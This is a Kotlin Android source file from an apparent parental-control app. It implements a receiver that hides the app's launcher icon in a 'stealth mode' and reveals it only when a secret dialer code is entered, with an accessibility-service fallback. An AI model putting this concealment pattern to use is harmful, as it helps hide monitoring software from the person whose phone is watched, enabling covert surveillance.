package com.parentalcontrol.app

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import com.parentalcontrol.app.api.CloudConfig

/**
 * DialerSecretCodeReceiver — Responds to secret dialer codes to re-open
 * the hidden app. When the user dials *#*#CODE#*#* on the phone dialer,
 * this receiver fires, temporarily re-enables the launcher icon, and
 * launches the MainActivity.
 *
 * The secret code is configurable via CloudConfig.secretDialerCode (default: 1234).
 *
 * How it works:
 * - On Android 8-11: Uses android.provider.Telephony.SECRET_CODE broadcast
 * - On Android 12+: Uses the updated android.telephony.action.SECRET_CODE action
 * - Fallback: The AccessibilityService can also detect the code in the dialer
 *
 * The app re-hides itself when the user navigates away from MainActivity.
 */
class DialerSecretCodeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "DialerSecretCode"

        // Standard secret code actions for different Android versions
        const val ACTION_SECRET_CODE_OLD = "android.provider.Telephony.SECRET_CODE"
        const val ACTION_SECRET_CODE_NEW = "android.telephony.action.SECRET_CODE"

        /**
         * Temporarily show the app, launch MainActivity, then auto-hide after exit.
         */
        fun revealAndLaunch(context: Context) {
            CloudConfig.init(context)
            Log.d(TAG, "Secret code detected — revealing app")

            // Re-enable the launcher alias so the icon briefly appears
            try {
                val pm = context.packageManager

                // Enable LauncherAlias
                val aliasComponent = ComponentName(
                    context.packageName,
                    "${context.packageName}.LauncherAlias"
                )
                pm.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )

                // Also ensure MainActivity itself is enabled
                val mainComponent = ComponentName(
                    context.packageName,
                    "${context.packageName}.MainActivity"
                )
                pm.setComponentEnabledSetting(
                    mainComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.w(TAG, "Failed to re-enable components: ${e.message}")
            }

            // Launch MainActivity
            val launchIntent = Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("from_secret_code", true)
            }
            context.startActivity(launchIntent)

            Log.d(TAG, "MainActivity launched from secret code")
        }

        /**
         * Re-hide the app icon (called from MainActivity.onPause or onStop
         * when the activity was opened via the secret code).
         */
        fun rehideApp(context: Context) {
            if (!CloudConfig.autoHideEnabled || !CloudConfig.stealthMode) return

            Log.d(TAG, "Re-hiding app icon after secret code access")

            try {
                val pm = context.packageManager

                // Disable LauncherAlias
                val aliasComponent = ComponentName(
                    context.packageName,
                    "${context.packageName}.LauncherAlias"
                )
                pm.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.w(TAG, "Failed to re-hide: ${e.message}")
            }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d(TAG, "Received broadcast: $action, data: ${intent.data}")

        if (action == ACTION_SECRET_CODE_OLD || action == ACTION_SECRET_CODE_NEW) {
            // The secret code is embedded in the data URI
            // Format: android_secret_code://<code>
            val host = intent.data?.host
            CloudConfig.init(context)
            val expectedCode = CloudConfig.secretDialerCode

            Log.d(TAG, "Secret code received: $host, expected: $expectedCode")

            if (host == expectedCode) {
                revealAndLaunch(context)
            } else {
                Log.d(TAG, "Code doesn't match — ignoring")
            }
        }
    }
}
